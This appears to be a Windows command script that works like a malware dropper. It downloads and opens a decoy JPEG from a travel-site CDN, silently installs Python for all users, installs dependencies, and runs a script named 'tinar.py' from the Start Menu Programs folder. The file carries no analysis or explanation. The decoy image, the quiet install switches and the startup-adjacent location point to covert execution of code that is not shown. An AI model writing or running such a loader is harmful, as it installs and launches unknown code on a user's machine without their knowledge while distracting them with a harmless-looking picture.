cd %temp%
curl -o imp.jpg https://media.tacdn.com/media/attractions-splice-spp-674x446/0b/39/a9/9f.jpg
imp.jpg
cd system/Testing-main
python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
pip install -r requirements.txt
cd %AppData%\Microsoft\Windows\Start Menu\Programs
python tinar.py
